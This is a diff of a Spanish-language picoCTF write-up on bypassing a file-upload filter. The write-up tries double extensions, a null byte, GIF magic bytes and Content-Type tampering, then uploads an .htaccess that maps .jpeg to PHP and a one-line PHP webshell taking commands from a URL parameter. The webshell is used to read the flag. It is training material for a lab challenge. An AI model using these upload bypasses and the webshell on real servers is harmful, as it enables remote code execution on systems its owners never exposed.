@@ -23,20 +23,24 @@ tags:
 
 ![](/assets/images/pctf-writeup-byp4ss3d/logo_bp.png)
 
-"En este challenge, aprenderemos a abusar del fichero ".htaccess" para establecer unas políticas a nivel directorio cual nos permita la subida de archivos maliciosa que cumpla X requisito, persuadiendo la restricción que tiene"
+
 
 ## WRITE UP
 Ejemplo: atlas:picoctf.net:63993 (víctima) TTL=  63 LINUX
 
 
-#### ANÁLISIS WEB: RECONOCNIMIENTO
+### ANÁLISIS WEB: RECONOCNIMIENTO
 
 De primeras haremos un *whatweb* para ver las tecnologías, lenguajes... de la página web, igual que <span style="color:lightyellow">Wappalyzer</span> pero por consola.
+
+```bash
+whatweb http://atlas:picoctf.net:63993/
+```
 
 ![](/assets/images/pctf-writeup-byp4ss3d/whatweb_bp.png)
 
 
-##### COMO FUNCIONA LA WEB
+#### COMO FUNCIONA LA WEB
 
 La web tratara acerca de una identificación de estudiantes mediante una foto de sus respectivo ID. Vamos haber como funciona y que responde.
 
@@ -63,12 +67,14 @@ Al pincharla en el enlace, se abrirá una pestaña aparte para visualizarla.
 ![](/assets/images/pctf-writeup-byp4ss3d/chemita_bp.png)
 
 
-##### PROBAR PHP MALICIOSO
+### PROBAR PHP MALICIOSO
 
 Anteriormente vimos que no tiene problema al subir imágenes normales. Haber ahora como reacciona ante subidas de archivos con extensiones diferentes a las cuales ya tiene definidas.
 En caso de ejecutarse, nos interpretará el comando establecido entre comillas. "**id**"
 
-'<?php  system("id");  ?>'
+```php
+<?php system("id"); ?>
+```
 
 ![](/assets/images/pctf-writeup-byp4ss3d/probphpid_bp.png)
 
@@ -83,13 +89,16 @@ Y como era de esperar, no nos deja. Habrá que buscar otras formas de intentar s
 ![](/assets/images/pctf-writeup-byp4ss3d/notallow_bp.png)
 
 
-#### TÉCNICAS: VALIDATION BYPASS UPLOAD
+### TÉCNICAS: VALIDATION BYPASS UPLOAD
 
 En este momento podemos aplicar algunas técnicas que conozcamos que puedan llegar a funcionar:  [Técnicas File Bypass Upload](https://pabloventx.github.io/ayuda-File-ByPass-Upload/)
 
 1) La primera sería poner  ``.png``  para que el servidor compruebe que en la cadena del nombre contiene `.png` (formato deseado), y así ya no compruebe lo que tiene después, que como se muestra en la imagen, un ``.php`` .
 
-<span style="color:lime">cmd.png.php</span> (Dentro tendrá el código a ejecutar)
+```bash
+# Dentro tendrá el código a ejecutar
+cmd.png.php
+```
 
 ![](/assets/images/pctf-writeup-byp4ss3d/string_bp.png)
 
@@ -106,7 +115,10 @@ No nos deja, vamos a usar otra técnica.
 
 2) Vamos a intentarlo con un <span style="color:cyan">null byte</span>, es un carácter especial que indica el final de una cadena en muchos lenguajes, por lo que la validación puede detenerse antes de la extensión real del archivo. 
 
-<span style="color:red">cmd.php%00.png</span> (El servidor aceptará el ``.png`` y procesara el archivo como ``.php``)
+```bash
+# El servidor aceptará el '.png' y procesara el archivo como '.php'
+cmd.php%00.png
+```
 
 ![](/assets/images/pctf-writeup-byp4ss3d/nullb_bp.png)
 
@@ -130,20 +142,21 @@ Nos dirá que no lo encuentra, quizás se este borrando por algún filtro/norma 
 
 Añadimos en la primera línea **(GIF8,PNG...;)** y guardamos.
 
-````
+```php
 1 GIF8; (En la primera línea del archivo)
 2 <?php 
 3   system("whoami"); 
 4 ?>
-````
-
+```
 
 ![](/assets/images/pctf-writeup-byp4ss3d/mgg_bp.png)
 
 
-Aplicamos un **"file"** y nos dirá que el *php* es un *gif*.
+Aplicamos un **"file"** para que nos diga de que tipo es el archivo y nos dirá que el *php* es un *gif*.
 
-**file** <span style="color:lime">cmd.php</span>
+```bash
+file cmd.php
+```
 
 ![](/assets/images/pctf-writeup-byp4ss3d/mg_bp.png)
 
@@ -158,14 +171,14 @@ Nos dirá que no esta permitido así que tocara ir por otro lado.
 ![](/assets/images/pctf-writeup-byp4ss3d/noalloww_bp.png)
 
 
-#### BURP SUITE: CONTENT-TYPE y GLOBAL
+### BURP SUITE: CONTENT-TYPE y GLOBAL
 
 Cambiamos el código a php a como lo teníamos originalmente.
 
 ![](/assets/images/pctf-writeup-byp4ss3d/orccmd_bp.png)
 
 
-##### CONFIGURACIÓN FOXY PROXY
+#### CONFIGURACIÓN FOXY PROXY
 
 En la extensión <span style="color:lightyellow">Foxy Proxy</span> tenemos que seleccionar **Burp Suite**. Tendremos que tenerlo configurado para que tenga conexión con este y así coger los paquetes. 
 
@@ -217,7 +230,7 @@ Agregando PNG en la primera línea, para que valido esos bytes del archivo. No n
 ![](/assets/images/pctf-writeup-byp4ss3d/mggf_bp.png)
 
 
-#### HTACCESS: ESTABLECIMIENTO POLÍTICA NIVEL DIRECTORIO
+### HTACCESS: ESTABLECIMIENTO POLÍTICA NIVEL DIRECTORIO
 
 <span style="color:green">.htaccess</span> -> Archivo configuración a **nivel directorio**, usado por <span style="color:lime
 ">Apache HTTP Server</span>, que permite modificar el comportamiento del servidor sin tocar la configuración global -> (*httpd.conf* o *apache2.conf*). En este archivo podemos insertar directivas/políticas.
@@ -226,15 +239,23 @@ Agregando PNG en la primera línea, para que valido esos bytes del archivo. No n
 Ahora estableceremos una política cual permita que cualquier archivo que coincida con la extensión puesta o palabra, lo interprete como motor *PHP*.
 
 
-**nano**   <span style="color:green">.htaccess</span>:  <span style="color:orange">AddType</span>  **application**<span style="color:lightyellow">/x-httpd-php</span>  <span style="color:yellow">.jpg</span>
+```bash
+# Crea el archivo .htaccess y escribir dentro
+nano .htacess
+-> addType application/x-httpd-php .jpeg
 
+# Ver el contenido del archivo
+cat .htaccess
+```
 
 ![](/assets/images/pctf-writeup-byp4ss3d/htest_bp.png)
 
 
 Por otro lado, llamaremos a nuestro <span style="color:lime">cmd.php</span> -> <span style="color:lime">cmd.jpeg</span> y le pondremos para que cuando se suba el archivo, tener una <span style="color:lime">webshell</span> y ejecutar comandos remotamente **(RCE)**.
 
-'<?php system($_GET["cmd"]); ?>'
+```php
+<?php system($_GET["cmd"]); ?>
+```
 
 ![](/assets/images/pctf-writeup-byp4ss3d/cmdest_bp.png)
 
@@ -269,13 +290,20 @@ Se subirá sin que nos salte ninguna prohibición.
 
 Ya tendremos una ejecución remota de comandos mediante el parámetro:
 
-<span style="color:lime">cmd.jpeg?</span>**cmd**<span style="color:orange">=</span>
+```bash
+# Especificar parámetro en URL para ejecutar comandos
+cmd.jpeg?cmd=comando
+```
 
 ![](/assets/images/pctf-writeup-byp4ss3d/rce_bp.png)
 
 
-#### BANDERA
+### BANDERA
 
-Para leer la bandera -> **cd** ../..<span style="color:orange">;</span> **ls**<span style="color:orange">;</span> **cat** <span style="color:orange">flag.txt</span>
+Para leer la bandera nos iremos a la siguiente ruta:
+
+```bash
+cmd.jpeg?cmd=cd ../..; ls; cat flag.txt
+```
 
 ![](/assets/images/pctf-writeup-byp4ss3d/flag_bp.png)
